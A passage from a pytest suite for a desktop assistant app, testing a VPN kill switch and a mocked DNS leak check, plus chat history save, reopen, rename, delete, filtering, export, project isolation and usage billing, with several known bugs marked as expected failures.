        assert any("kill switch" in w.lower() for w in review.warnings)
        again.disarm_kill_switch()
        assert pf.ks.status().armed is False
        assert vpn_execution._killswitch_armed() is False

    @pytest.mark.xfail(strict=True, reason=(
        "BUG: agents/vpn_agent/services/killswitch.py:381-392 disarm() deletes the "
        "killswitch.armed marker before checking whether pfctl succeeded, so a cancelled "
        "authorisation leaves the pf anchor loaded (traffic still blocked) while status() "
        "and Tunnel report 'Disarmed'."))
    def test_a_failed_disarm_must_not_forget_that_the_switch_is_still_armed(
            self, tunnel, pf, dialogs):
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        pf.result = (False, "Cancelled.")
        tunnel.disarm_kill_switch()
        assert "failed" in tunnel.kill_switch_status_label.text().lower()
        assert pf.ks.status().armed is True


# ── 5. DNS leak check ───────────────────────────────────────────────────────

class Resp:
    def __init__(self, payload=None, text="", status_code=200):
        self._payload, self.text, self.status_code = payload, text, status_code

    def json(self):
        return self._payload


def bash_ws(result=None, id_text="testid123", id_status=200):
    def get(url, timeout=None, headers=None, params=None):
        get.calls.append(url)
        if url.endswith("/id"):
            return Resp(text=id_text, status_code=id_status)
        return Resp(payload=result)
    get.calls = []
    return get


@pytest.fixture
def dns(monkeypatch, tunnel):
    """The real DnsLeakWorker + real run_dns_leak_test, with the resolver and
    bash.ws replaced. Nothing here can reach the network (the guard would trip)."""
    from agents.vpn_agent.services import dns_check
    from ui.panels.vpn import VpnPanel
    from ui.workers import DnsLeakWorker

    box = SimpleNamespace(resolved=[], get=bash_ws([]), workers=[], on_resolve=None)

    class Sync(DnsLeakWorker):
        def __init__(self):
            super().__init__()
            box.workers.append(self)

        def start(self):
            self.run()

        def isRunning(self):          # noqa: N802
            return False

    def resolve(host):
        box.resolved.append(host)
        if box.on_resolve:
            box.on_resolve(box.workers[-1])

    real = dns_check.run_dns_leak_test
    monkeypatch.setattr(dns_check, "run_dns_leak_test",
                        lambda **kw: real(resolve=resolve, session_get=lambda *a, **k: box.get(*a, **k),
                                          probe_count=3, **kw))
    monkeypatch.setattr(VpnPanel, "dns_leak_worker_class", Sync)
    box.panel = tunnel
    return box


class TestDnsLeak:
    def test_positive_no_leak_verdict_names_resolvers_and_networks(self, dns):
        dns.get = bash_ws([
            {"type": "ip", "ip": "203.0.113.5", "country_name": "DE", "asn": "AS3320"},
            {"type": "dns", "ip": "203.0.113.53", "country_name": "DE", "asn": "AS3320"},
            {"type": "conclusion", "ip": "DNS is not leaking."},
        ])
        dns.panel.run_dns_leak_test()
        label = dns.panel.dns_leak_label.text()
        assert "1 resolver(s)" in label and "no leak detected" in label and "203.0.113.53" in label
        assert len(dns.resolved) == 3 and dns.resolved[0] == "1.testid123.bash.ws"
        assert dns.panel.dns_leak_btn.isEnabled()

    def test_positive_a_leak_is_reported_as_a_possible_leak(self, dns):
        dns.get = bash_ws([
            {"type": "ip", "ip": "203.0.113.5", "asn": "AS3320"},
            {"type": "dns", "ip": "8.8.8.8", "asn": "AS15169", "country_name": "US"},
        ])
        dns.panel.run_dns_leak_test()
        assert "possible leak" in dns.panel.dns_leak_label.text()

    def test_invalid_a_bad_test_id_is_a_clean_message_and_probes_nothing(self, dns):
        dns.get = bash_ws([], id_text="not a valid id!")
        dns.panel.run_dns_leak_test()
        assert dns.panel.dns_leak_label.text().startswith("Could not run the test")
        assert dns.resolved == [] and dns.panel.dns_leak_btn.isEnabled()

    def test_invalid_no_resolvers_observed_is_not_reported_as_safe(self, dns):
        dns.get = bash_ws({"error": "No DNS servers found. Try again..."})
        dns.panel.run_dns_leak_test()
        label = dns.panel.dns_leak_label.text()
        assert "No DNS servers" in label and "no leak detected" not in label

    def test_denied_nothing_leaves_the_machine_until_the_button_is_pressed(self, dns, guard):
        fresh = dns.panel.make_another()
        assert fresh.dns_leak_label.text() == "Not checked"
        assert dns.workers == [] and dns.resolved == [] and guard.blocked == []

    def test_denied_a_second_press_while_a_test_runs_starts_no_second_test(self, dns, monkeypatch):
        from ui.panels.vpn import VpnPanel

        class Hanging:
            made = []

            def __init__(self):
                Hanging.made.append(self)
                self.finished_signal = SimpleNamespace(connect=lambda f: None)
                self.error_signal = SimpleNamespace(connect=lambda f: None)

            def start(self):
                pass

            def isRunning(self):          # noqa: N802
                return True
        monkeypatch.setattr(VpnPanel, "dns_leak_worker_class", Hanging)
        dns.panel.run_dns_leak_test()
        dns.panel.run_dns_leak_test()
        assert len(Hanging.made) == 1
        assert not dns.panel.dns_leak_btn.isEnabled()

    def test_cancel_stop_between_probes_reports_stopped_and_never_reads_the_result(self, dns):
        dns.on_resolve = lambda worker: worker.cancel()
        dns.panel.run_dns_leak_test()
        assert dns.panel.dns_leak_label.text() == "Test stopped."
        assert len(dns.resolved) == 1
        assert dns.get.calls == ["https://bash.ws/id"]
        assert dns.panel.dns_leak_btn.isEnabled()

    def test_error_unreachable_service_and_a_worker_exception_both_re_enable_the_button(self, dns):
        def unreachable(*a, **k):
            raise ConnectionError("bash.ws unreachable")
        dns.get = unreachable
        dns.panel.run_dns_leak_test()
        assert "could not reach bash.ws" in dns.panel.dns_leak_label.text()
        assert dns.panel.dns_leak_btn.isEnabled()
        dns.panel._on_dns_leak_error("worker died")
        assert dns.panel.dns_leak_label.text() == "Error: worker died"
        assert dns.panel.dns_leak_btn.isEnabled()

    def test_persist_a_result_is_not_stored_so_a_restart_shows_not_checked(self, dns, tmp_path, state_dir):
        dns.get = bash_ws([{"type": "ip", "ip": "203.0.113.5", "asn": "AS1"},
                           {"type": "dns", "ip": "203.0.113.53", "asn": "AS1"},
                           {"type": "conclusion", "ip": "No DNS leak found."}])
        dns.panel.run_dns_leak_test()
        assert "no leak detected" in dns.panel.dns_leak_label.text()
        files = [p for p in list(tmp_path.rglob("*")) + list(state_dir.rglob("*")) if p.is_file()]
        assert not any("203.0.113.53" in p.read_text(errors="ignore") for p in files)
        again = dns.panel.make_another()
        assert again.dns_leak_label.text() == "Not checked"
        # and the same test run again gives the same verdict (stateless)
        again.dns_leak_worker_class = dns.panel.dns_leak_worker_class
        again.run_dns_leak_test()
        assert "no leak detected" in again.dns_leak_label.text()


# ═════════════════════════════════════════════════════════════════════════════
# CHAT
# ═════════════════════════════════════════════════════════════════════════════

class FakeChatWorker(QObject):
    """ChatWorker's surface with the thread and the model call removed."""

    token_signal = Signal(str)
    status_signal = Signal(str)
    finished_signal = Signal(str)
    error_signal = Signal(str)
    usage_signal = Signal(dict)
    instances: list = []

    def __init__(self, run_backend_func, backend, model, messages, prompt):
        super().__init__()
        self.backend, self.model = backend, model
        self.messages, self.prompt = list(messages), prompt
        self.running = False
        self.cancelled = False
        FakeChatWorker.instances.append(self)

    def start(self):
        self.running = True

    def isRunning(self):          # noqa: N802
        return self.running

    def cancel(self):
        self.cancelled = True

    def terminate(self):
        self.running = False

    def wait(self, _ms=0):
        self.running = False
        return True

    def stream(self, *chunks):
        for chunk in chunks:
            self.token_signal.emit(chunk)

    def finish(self, text, usage=None):
        if usage is not None:
            self.usage_signal.emit(usage)
        self.running = False
        self.finished_signal.emit(text)

    def fail(self, message):
        self.running = False
        self.error_signal.emit(message)


@pytest.fixture
def env(tmp_path, monkeypatch, dialogs):
    """Chat history, reports and dialogs redirected under tmp_path; every
    window built in the test (and its 'restart') shares them."""
    import main
    from services.history_store import HistoryStore
    from services.report_exporter import ReportExporter

    chats, reports = tmp_path / "chats", tmp_path / "reports"
    chats.mkdir()
    reports.mkdir()
    monkeypatch.setattr(main, "CHATS_DIR", chats)
    monkeypatch.setattr(main, "HistoryStore", lambda: HistoryStore(chats))
    monkeypatch.setattr(main, "ReportExporter", lambda: ReportExporter(reports))
    monkeypatch.setattr(main, "ChatWorker", FakeChatWorker)
    FakeChatWorker.instances.clear()
    return SimpleNamespace(chats=chats, reports=reports, dialogs=dialogs, made=[])


@pytest.fixture
def make_window(env, guard, qapp):
    import main

    def make():
        with guard.open():
            window = main.GodAI()
        window.assess_local_model = lambda model: None
        window.agent_box.setCurrentText("chat")
        window.execution_mode_box.setCurrentText("Local only")
        idx = window.provider_box.findText("ollama")
        if idx >= 0:
            window.provider_box.setCurrentIndex(idx)
        window.new_chat()
        env.made.append(window)
        return window

    base = set(QApplication.topLevelWidgets())
    yield make
    # Windows left alive make every later construction slower (each restyles
    # all the others), so close and delete what this test created.
    for window in env.made:
        window.chat_worker = None
        with contextlib.suppress(Exception):
            window.resource_timer.stop()
            window.close()
    for widget in set(QApplication.topLevelWidgets()) - base:
        widget.deleteLater()
    QApplication.sendPostedEvents(None, QEvent.DeferredDelete)


@pytest.fixture
def win(make_window):
    return make_window()


def usage_rows(**where):
    sql, args = "SELECT * FROM usage", []
    if where:
        sql += " WHERE " + " AND ".join(f"{k} = ?" for k in where)
        args = list(where.values())
    with get_connection() as conn:
        return [dict(r) for r in conn.execute(sql + " ORDER BY id", args).fetchall()]


def run_row(run_id):
    with get_connection() as conn:
        row = conn.execute("SELECT * FROM runs WHERE run_id = ?", (run_id,)).fetchone()
    return dict(row) if row else None


def run_count():
    with get_connection() as conn:
        return conn.execute("SELECT COUNT(*) FROM runs").fetchone()[0]


def usage_count():
    with get_connection() as conn:
        return conn.execute("SELECT COUNT(*) FROM usage").fetchone()[0]


def send(win, text):
    win.input_box.setPlainText(text)
    before = len(FakeChatWorker.instances)
    win.send_prompt()
    return FakeChatWorker.instances[-1] if len(FakeChatWorker.instances) > before else None


def turn(win, text, answer="ok", usage=None):
    worker = send(win, text)
    assert worker is not None, f"no worker for {text!r}"
    worker.stream(answer)
    worker.finish(answer, usage=usage or {"input_tokens": 10, "output_tokens": 5})
    return worker


def saved(env):
    return sorted(env.chats.glob("*.json"))


def load(path):
    return json.loads(path.read_text(encoding="utf-8"))


def seed(env, name, agent="chat", prompt="hello", project=None, title=None, raw=None):
    path = env.chats / f"{name}.json"
    if raw is not None:
        path.write_text(raw, encoding="utf-8")
        return path
    data = {"timestamp": name, "agent": agent, "backend": "ollama", "model": "m",
            "command": "General Chat",
            "messages": [{"role": "user", "content": prompt},
                         {"role": "assistant", "content": f"re: {prompt}"}],
            "response": f"re: {prompt}"}
    if project:
        data["project"] = project
    if title:
        data["title"] = title
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


def titles(win):
    return [win.history_list.item(i).text() for i in range(win.history_list.count())]


def item_for(win, fragment):
    for i in range(win.history_list.count()):
        item = win.history_list.item(i)
        if fragment in item.text():
            return item
    raise AssertionError(f"no saved chat containing {fragment!r}: {titles(win)}")


def use_cloud(win, provider="openai"):
    win.execution_mode_box.setCurrentText("Hybrid allowed")
    idx = win.provider_box.findText(provider)
    assert idx >= 0
    win.provider_box.setCurrentIndex(idx)
    getattr(win, f"allow_{provider}_checkbox").setChecked(True)


@pytest.fixture
def projects(win):
    """Two throw-away projects, archived again afterwards (the DB is shared)."""
    tag = uuid.uuid4().hex[:6]
    made = [win.registry.upsert_project({"id": f"alpha-{tag}", "name": f"Alpha {tag}"}),
            win.registry.upsert_project({"id": f"bravo-{tag}", "name": f"Bravo {tag}"})]
    win.refresh_project_controls()
    yield SimpleNamespace(a=made[0]["id"], b=made[1]["id"])
    for project in made:
        win.registry.archive_project(project["id"])


# ── Save ────────────────────────────────────────────────────────────────────

class TestChatSave:
    def test_positive_two_turns_are_one_file_holding_the_whole_conversation(self, win, env):
        turn(win, "first question", "first answer")
        turn(win, "second question", "second answer")
        (path,) = saved(env)
        data = load(path)
        contents = [m["content"] for m in data["messages"] if m["role"] != "system"]
        assert contents == ["first question", "first answer", "second question", "second answer"]
        assert data["agent"] == "chat" and data["response"] == "second answer"
        assert titles(win) == ["chat: first question"]

    def test_invalid_an_empty_prompt_starts_nothing_and_saves_nothing(self, win, env):
        runs = run_count()
        assert send(win, "   \n ") is None
        assert env.dialogs.warnings and "enter text" in env.dialogs.warnings[-1][1].lower()
        assert saved(env) == [] and run_count() == runs

    def test_denied_declining_the_paid_api_prompt_sends_saves_and_bills_nothing(self, win, env):
        use_cloud(win)
        env.dialogs.answer = QMessageBox.No
        runs, rows = run_count(), usage_count()
        assert send(win, "costly question") is None
        assert any("external API" in q[1] for q in env.dialogs.questions)
        assert saved(env) == [] and run_count() == runs and usage_count() == rows
        assert win.send_btn.isEnabled() and not win.send_btn.isHidden()

    def test_cancel_stop_and_error_save_nothing_and_a_stop_never_rewrites_an_existing_file(self, win, env):
        worker = send(win, "will be stopped")
        worker.stream("partial")
        win.stop_current_task()
        assert saved(env) == []
        worker = send(win, "will fail")
        worker.fail("429 Too Many Requests")
        assert saved(env) == []
        turn(win, "kept", "kept answer")
        (path,) = saved(env)
        before = path.read_bytes()
        worker = send(win, "stopped again")
        worker.stream("half")
        win.stop_current_task()
        assert path.read_bytes() == before

    def test_persist_a_restarted_window_lists_the_saved_chat(self, win, env, make_window):
        turn(win, "remember me", "noted")
        restarted = make_window()
        assert titles(restarted) == ["chat: remember me"]


# ── Reopen ──────────────────────────────────────────────────────────────────

class TestChatReopen:
    def test_positive_reopen_restores_the_conversation_and_continuing_appends_to_the_same_file(
            self, win, env):
        turn(win, "alpha question", "alpha answer")
        win.new_chat()
        assert win.current_messages == []
        win.open_selected_chat(item_for(win, "alpha question"))
        assert [m["content"] for m in win.current_messages if m["role"] != "system"] == [
            "alpha question", "alpha answer"]
        assert "chat" in win.route_result_label.text()
        worker = turn(win, "follow-up", "follow answer")
        sent = " ".join(m["content"] for m in worker.messages)
        assert "alpha question" in sent and "alpha answer" in sent       # context carried
        (path,) = saved(env)
        assert [m["content"] for m in load(path)["messages"] if m["role"] != "system"][-2:] == [
            "follow-up", "follow answer"]

    def test_invalid_a_corrupt_file_is_listed_but_opening_it_warns_and_keeps_the_open_chat(
            self, win, env):
        turn(win, "healthy", "fine")
        seed(env, "0000-corrupt", raw="{this is not json")
        win.load_history_list()
        before = list(win.current_messages)
        win.open_selected_chat(item_for(win, "0000-corrupt"))
        assert any("Could not open saved chat" in w[1] for w in env.dialogs.warnings)
        assert win.current_messages == before

    def test_denied_continuing_with_an_unticked_cloud_provider_changes_nothing(self, win, env):
        turn(win, "local turn", "local answer")
        (path,) = saved(env)
        before = path.read_bytes()
        win.open_selected_chat(item_for(win, "local turn"))
        win.execution_mode_box.setCurrentText("Hybrid allowed")
        win.provider_box.setCurrentIndex(win.provider_box.findText("openai"))
        win.allow_openai_checkbox.setChecked(False)
        assert send(win, "now with cloud") is None
        assert any("not enabled" in w[1] for w in env.dialogs.warnings)
        assert path.read_bytes() == before

    def test_cancel_stopping_a_continued_turn_keeps_the_file_and_the_link_to_it(self, win, env):
        turn(win, "base", "base answer")
        (path,) = saved(env)
        before = path.read_bytes()
        win.new_chat()
        win.open_selected_chat(item_for(win, "base"))
        worker = send(win, "continue")
        worker.stream("partial")
        win.stop_current_task()
        assert path.read_bytes() == before
        assert win.current_chat_path == str(path)
        turn(win, "retry", "retry answer")
        assert len(saved(env)) == 1
        assert "retry answer" in load(path)["response"]

    def test_persist_a_restarted_window_reopens_and_continues_in_the_same_file(
            self, win, env, make_window):
        turn(win, "before restart", "answer one")
        (path,) = saved(env)
        restarted = make_window()
        restarted.open_selected_chat(item_for(restarted, "before restart"))
        assert restarted.current_chat_path == str(path)
        worker = turn(restarted, "after restart", "answer two")
        assert "before restart" in " ".join(m["content"] for m in worker.messages)
        assert saved(env) == [path]
        assert load(path)["response"] == "answer two"


# ── Rename ──────────────────────────────────────────────────────────────────

def answer_name(monkeypatch, text, ok=True):
    monkeypatch.setattr(QInputDialog, "getText", staticmethod(lambda *a, **k: (text, ok)))


class TestChatRename:
    def test_positive_the_new_name_shows_in_the_list_and_the_messages_are_untouched(
            self, win, env, monkeypatch):
        turn(win, "unnamed thread", "answer")
        (path,) = saved(env)
        messages = load(path)["messages"]
        answer_name(monkeypatch, "  Quarterly review  ")
        win.rename_selected_chat(item_for(win, "unnamed thread"))
        assert titles(win) == ["Quarterly review"]
        assert load(path)["title"] == "Quarterly review" and load(path)["messages"] == messages

    def test_invalid_a_blank_name_clears_the_title_and_falls_back_to_the_first_prompt(
            self, win, env, monkeypatch):
        path = seed(env, "a", prompt="original prompt", title="Old name")
        win.load_history_list()
        answer_name(monkeypatch, "   ")
        win.rename_selected_chat(item_for(win, "Old name"))
        assert "title" not in load(path)
        assert titles(win) == ["chat: original prompt"]

    def test_denied_cancelling_the_name_dialog_leaves_the_file_byte_for_byte(
            self, win, env, monkeypatch):
        path = seed(env, "a", prompt="keep", title="Keep me")
        win.load_history_list()
        before = path.read_bytes()
        answer_name(monkeypatch, "Something else", ok=False)
        win.rename_selected_chat(item_for(win, "Keep me"))
        assert path.read_bytes() == before

    def test_error_renaming_a_chat_whose_file_vanished_does_not_crash(self, win, env, monkeypatch):
        path = seed(env, "a", prompt="vanishing")
        win.load_history_list()
        item = item_for(win, "vanishing")
        path.unlink()
        answer_name(monkeypatch, "New")
        win.rename_selected_chat(item)           # must not raise
        assert not path.exists()

    @pytest.mark.xfail(strict=True, reason=(
        "BUG: main.py:4619-4621 (rename_selected_chat; same pattern in _assign_chat_to_project "
        "main.py:4352 and rename_selected_search) opens the chat file with 'w' and then "
        "json.dump()s into it. A write failure (disk full) after the truncate leaves an empty, "
        "unreadable chat. HistoryStore.update_chat already writes tmp-then-replace; rename does not."))
    def test_error_a_failed_write_during_rename_must_not_destroy_the_saved_chat(
            self, win, env, monkeypatch):
        path = seed(env, "a", prompt="precious conversation")
        win.load_history_list()
        before = path.read_bytes()
        answer_name(monkeypatch, "Renamed")
        item = item_for(win, "precious conversation")
        with monkeypatch.context() as m:
            m.setattr(json, "dump", lambda *a, **k: (_ for _ in ()).throw(OSError("No space left on device")))
            win.rename_selected_chat(item)
        assert path.read_bytes() == before

    def test_persist_the_name_survives_a_restart_and_a_later_turn(self, win, env, monkeypatch, make_window):
        turn(win, "thread", "a1")
        answer_name(monkeypatch, "Named thread")
        win.rename_selected_chat(item_for(win, "thread"))
        restarted = make_window()
        assert titles(restarted) == ["Named thread"]
        restarted.open_selected_chat(item_for(restarted, "Named thread"))
        turn(restarted, "more", "a2")
        assert titles(restarted) == ["Named thread"]
        assert len(saved(env)) == 1


# ── Delete ──────────────────────────────────────────────────────────────────

class TestChatDelete:
    def test_positive_yes_removes_the_file_and_the_row(self, win, env):
        turn(win, "to delete", "gone soon")
        win.history_list.setCurrentItem(item_for(win, "to delete"))
        win.delete_selected_chat()
        assert saved(env) == [] and titles(win) == []
        assert "to delete" in env.dialogs.questions[-1][1]

    def test_invalid_deleting_with_nothing_selected_removes_nothing(self, win, env):
        seed(env, "a", prompt="stay")
        win.load_history_list()
        win.history_list.setCurrentItem(None)
        win.delete_selected_chat()
        assert env.dialogs.infos and env.dialogs.questions == []
        assert len(saved(env)) == 1

    def test_denied_no_keeps_the_file_and_the_row(self, win, env):
        seed(env, "a", prompt="keep me")
        win.load_history_list()
        env.dialogs.answer = QMessageBox.No
        win.history_list.setCurrentItem(item_for(win, "keep me"))
        win.delete_selected_chat()
        assert len(saved(env)) == 1 and len(titles(win)) == 1

    def test_error_a_failed_delete_is_reported_and_the_file_stays(self, win, env, monkeypatch):
        from pathlib import Path
        seed(env, "a", prompt="locked")
        win.load_history_list()
        win.history_list.setCurrentItem(item_for(win, "locked"))

        def deny(self, *a, **k):
            raise PermissionError("read-only volume")
        with monkeypatch.context() as m:
            m.setattr(Path, "unlink", deny)
            win.delete_selected_chat()
        assert any(w[0] == "Delete Failed" and "read-only volume" in w[1] for w in env.dialogs.warnings)
        assert len(saved(env)) == 1

    def test_deleting_the_open_chat_means_the_next_turn_starts_a_new_file(self, win, env):
        turn(win, "doomed", "answer")
        (old,) = saved(env)
        win.history_list.setCurrentItem(item_for(win, "doomed"))
        win.delete_selected_chat()
        assert win.current_chat_path is None
        turn(win, "fresh start", "answer two")
        (new,) = saved(env)
        assert new != old and not old.exists()          # the visible thread continues in a new file

    def test_persist_a_deleted_chat_stays_deleted_after_a_restart(self, win, env, make_window):
        turn(win, "one", "a")
        other = make_window()
        turn(other, "two", "b")
        win.load_history_list()
        win.history_list.setCurrentItem(item_for(win, "chat: one"))
        win.delete_selected_chat()
        restarted = make_window()
        assert titles(restarted) == ["chat: two"]


# ── Filter by agent (and search) ────────────────────────────────────────────

class TestChatFilter:
    @pytest.fixture
    def filled(self, win, env):
        seed(env, "1", agent="chat", prompt="alpha draft")
        seed(env, "2", agent="vpn", prompt="bravo tunnel")
        seed(env, "3", agent="osint", prompt="charlie lookup")
        win.load_history_list()
        return win

    def test_positive_the_agent_filter_narrows_and_all_agents_restores(self, filled):
        win = filled
        assert len(titles(win)) == 3
        win.history_agent_filter.setCurrentText("vpn")
        assert titles(win) == ["vpn: bravo tunnel"]
        win.history_agent_filter.setCurrentText("All agents")
        assert len(titles(win)) == 3

    def test_invalid_search_text_is_a_plain_substring_not_a_pattern(self, filled):
        win = filled
        for text in ("[", ".*", "(", "\\", "%"):
            win.history_search.setText(text)
            assert titles(win) == [], text
        win.history_search.setText("  ALPHA ")
        assert titles(win) == ["chat: alpha draft"]

    def test_denied_a_filter_that_matches_nothing_shows_an_empty_list_and_touches_no_file(
            self, filled, env):
        win = filled
        before = {p.name: p.read_bytes() for p in saved(env)}
        win.history_agent_filter.setCurrentText("osint")
        win.history_search.setText("alpha")
        assert titles(win) == []
        assert {p.name: p.read_bytes() for p in saved(env)} == before

    def test_cancel_when_the_filtered_agents_last_chat_is_deleted_the_filter_falls_back_to_all(
            self, filled, env):
        win = filled
        win.history_agent_filter.setCurrentText("vpn")
        win.history_list.setCurrentItem(win.history_list.item(0))
        win.delete_selected_chat()
        assert win.history_agent_filter.currentText() == "All agents"
        assert sorted(titles(win)) == ["chat: alpha draft", "osint: charlie lookup"]
        assert [win.history_agent_filter.itemText(i) for i in range(win.history_agent_filter.count())] == [
            "All agents", "chat", "osint"]

    def test_error_a_corrupt_file_does_not_break_the_list_or_the_filter(self, filled, env):
        win = filled
        seed(env, "0-bad", raw="not json at all")
        win.load_history_list()
        assert "chat: 0-bad" in titles(win)
        win.history_agent_filter.setCurrentText("osint")
        assert titles(win) == ["osint: charlie lookup"]

    def test_persist_a_restarted_window_rebuilds_the_filter_options_from_disk(
            self, filled, make_window):
        restarted = make_window()
        assert [restarted.history_agent_filter.itemText(i)
                for i in range(restarted.history_agent_filter.count())] == [
            "All agents", "chat", "osint", "vpn"]
        restarted.history_agent_filter.setCurrentText("osint")
        assert titles(restarted) == ["osint: charlie lookup"]


# ── Export report ───────────────────────────────────────────────────────────

class TestChatExport:
    def test_positive_the_report_holds_the_visible_transcript(self, win, env):
        turn(win, "Größe prüfen", "Die Größe ist 5 µm.")
        win.export_report()
        (report,) = list(env.reports.glob("*.txt"))
        text = report.read_text(encoding="utf-8")
        assert text == win.output_box.toPlainText().strip()
        assert "Größe prüfen" in text and "5 µm" in text
        assert report.name.endswith("chat_report.txt")
        assert str(report) in env.dialogs.infos[-1][1]

    def test_invalid_exporting_an_empty_window_writes_no_file(self, win, env):
        win.export_report()
        assert list(env.reports.glob("*")) == []
        assert "No output" in env.dialogs.warnings[-1][1]

    def test_denied_a_second_export_never_overwrites_the_first(self, win, env):
        turn(win, "q", "a")
        win.export_report()
        first = {p.name: p.read_bytes() for p in env.reports.glob("*.txt")}
        win.export_report()
        both = {p.name: p.read_bytes() for p in env.reports.glob("*.txt")}
        assert len(both) == 2
        assert all(both[name] == data for name, data in first.items())

    @pytest.mark.xfail(strict=True, reason=(
        "BUG: main.py:4687-4694 export_report() has no error handling around "
        "report_exporter.export_text_report(); an unwritable or full reports folder raises "
        "out of the slot, so the user gets no message and no report."))
    def test_error_an_unwritable_report_folder_must_be_reported_not_swallowed(
            self, win, env, monkeypatch):
        turn(win, "q", "a")
        monkeypatch.setattr(win.report_exporter, "export_text_report",
                            lambda *a, **k: (_ for _ in ()).throw(OSError("read-only file system")))
        win.export_report()
        assert any("read-only" in w[1] for w in env.dialogs.warnings + env.dialogs.criticals)

    def test_persist_the_report_survives_a_restart_and_a_new_export_adds_another(
            self, win, env, make_window):
        turn(win, "kept", "answer")
        win.export_report()
        (first,) = list(env.reports.glob("*.txt"))
        restarted = make_window()
        restarted.open_selected_chat(item_for(restarted, "kept"))
        restarted.export_report()
        reports = list(env.reports.glob("*.txt"))
        assert len(reports) == 2 and first.read_text(encoding="utf-8").count("kept") >= 1


# ── Multi-turn context without cross-project leakage ────────────────────────

ALPHA_SECRET = "ALPHA-ONLY-7731"
BRAVO_SECRET = "BRAVO-ONLY-4410"


class TestChatContextAndProjects:
    def test_positive_every_turn_carries_the_earlier_turns_but_never_notices(self, win, env, projects):
        win._set_active_project(projects.a)
        turn(win, f"remember {ALPHA_SECRET}", "remembered")
        worker = send(win, "what did I say?")
        roles = [m["role"] for m in worker.messages]
        assert roles[0] == "system" and roles.count("system") == 1
        assert ALPHA_SECRET in " ".join(m["content"] for m in worker.messages)
        worker.fail("boom")                                    # leaves a UI-only notice behind
        worker = send(win, "retry")
        assert all(m["content"] != "" for m in worker.messages)
        assert not any("could not be completed" in m["content"] for m in worker.messages)

    def test_positive_a_new_chat_in_another_project_sees_nothing_of_the_first(
            self, win, env, projects):
        win._set_active_project(projects.a)
        turn(win, f"private to alpha {ALPHA_SECRET}", "alpha reply")
        win.new_chat()
        win._set_active_project(projects.b)
        worker = turn(win, f"private to bravo {BRAVO_SECRET}", "bravo reply")
        assert ALPHA_SECRET not in repr(worker.messages) and "alpha reply" not in repr(worker.messages)
        files = {load(p)["project"]: p.read_text() for p in saved(env)}
        assert set(files) == {projects.a, projects.b}
        assert BRAVO_SECRET not in files[projects.a] and ALPHA_SECRET not in files[projects.b]

    def test_invalid_a_project_that_no_longer_exists_files_the_chat_as_unfiled(self, win, env, projects):
        win._set_active_project("ghost-project")
        assert win.active_project_id is None
        turn(win, "orphan", "reply")
        (path,) = saved(env)
        assert "project" not in load(path)

    def test_denied_a_blocked_request_in_project_b_leaves_project_a_untouched(
            self, win, env, projects):
        win._set_active_project(projects.a)
        turn(win, f"alpha {ALPHA_SECRET}", "reply")
        (path,) = saved(env)
        before = path.read_bytes()
        win.new_chat()
        win._set_active_project(projects.b)
        use_cloud(win)
        env.dialogs.answer = QMessageBox.No
        assert send(win, "bravo cloud request") is None
        assert path.read_bytes() == before and len(saved(env)) == 1

    def test_cancel_stopping_a_turn_in_project_b_files_nothing_under_either_project(
            self, win, env, projects):
        win._set_active_project(projects.a)
        turn(win, "alpha", "reply")
        win.new_chat()
        win._set_active_project(projects.b)
        worker = send(win, "bravo")
        worker.stream("half")
        win.stop_current_task()
        assert [load(p)["project"] for p in saved(env)] == [projects.a]
        assert usage_rows(project=projects.b) == []

    def test_persist_a_restart_reopens_each_chat_in_its_own_project_without_mixing_context(
            self, win, env, projects, make_window):
        win._set_active_project(projects.a)
        turn(win, f"alpha {ALPHA_SECRET}", "alpha reply")
        win.new_chat()
        win._set_active_project(projects.b)
        turn(win, f"bravo {BRAVO_SECRET}", "bravo reply")
        restarted = make_window()
        restarted.open_selected_chat(item_for(restarted, ALPHA_SECRET))
        assert restarted.active_project_id == projects.a
        worker = turn(restarted, "continue", "more")
        assert BRAVO_SECRET not in repr(worker.messages)
        restarted.new_chat()
        restarted.open_selected_chat(item_for(restarted, BRAVO_SECRET))
        assert restarted.active_project_id == projects.b
        worker = turn(restarted, "continue b", "more b")
        assert ALPHA_SECRET not in repr(worker.messages)
        by_project = {load(p)["project"]: p.read_text() for p in saved(env)}
        assert BRAVO_SECRET not in by_project[projects.a] and ALPHA_SECRET not in by_project[projects.b]


# ── Usage attribution (including after a restart) ───────────────────────────

class TestChatUsageAttribution:
    def test_positive_a_finished_turn_is_billed_to_its_agent_and_project(self, win, env, projects):
        win._set_active_project(projects.a)
        turn(win, "billed", "ok", usage={"input_tokens": 120, "output_tokens": 30})
        (row,) = usage_rows(project=projects.a)
        assert (row["agent"], row["backend"]) == ("chat", "ollama")
        assert (row["input_tokens"], row["output_tokens"]) == (120, 30)
        assert usage_rows(project=projects.b) == []

    def test_positive_paid_usage_is_attributed_to_the_project_and_survives_a_restart(
            self, win, env, projects, make_window):
        from services.usage_tracker import UsageTracker
        win._set_active_project(projects.a)
        use_cloud(win)
        turn(win, "paid question", "paid answer", usage={"input_tokens": 100000, "output_tokens": 50000})
        (row,) = usage_rows(project=projects.a)
        assert row["cloud"] == 1 and row["cost_eur"] > 0
        restarted = make_window()
        tracker = UsageTracker()
        assert tracker.get_project_today_total(projects.a) == pytest.approx(row["cost_eur"])
        assert tracker.get_project_today_total(projects.b) == 0.0
        assert restarted.usage_tracker.get_project_today_total(projects.a) == pytest.approx(row["cost_eur"])
        assert restarted.usage_tracker.get_today_total() >= row["cost_eur"]

    def test_invalid_an_unknown_project_is_not_attributed_to_anyone(self, win, env, projects):
        win._set_active_project("ghost-project")
        rows = usage_count()
        turn(win, "orphan", "ok")
        assert usage_count() == rows + 1
        assert usage_rows(project="ghost-project") == []

    def test_denied_a_declined_paid_request_adds_no_usage_row(self, win, env, projects):
        win._set_active_project(projects.a)
        use_cloud(win)
        env.dialogs.answer = QMessageBox.No
        rows = usage_count()
        assert send(win, "declined") is None
        assert usage_count() == rows and usage_rows(project=projects.a) == []

    def test_cancel_and_error_bill_nothing_and_close_their_runs(self, win, env, projects):
        win._set_active_project(projects.a)
        send(win, "stopped")
        stopped = win.active_run_id
        win.stop_current_task()
        send(win, "failed")
        failed = win.active_run_id
        FakeChatWorker.instances[-1].fail("401 Unauthorized")
        assert usage_rows(project=projects.a) == []
        assert run_row(stopped)["status"] == "cancelled"
        assert run_row(failed)["status"] == "error"

    def test_persist_after_a_restart_new_turns_add_to_the_same_project_total(
            self, win, env, projects, make_window):
        win._set_active_project(projects.a)
        turn(win, "one", "a")
        restarted = make_window()
        restarted.open_selected_chat(item_for(restarted, "chat: one"))
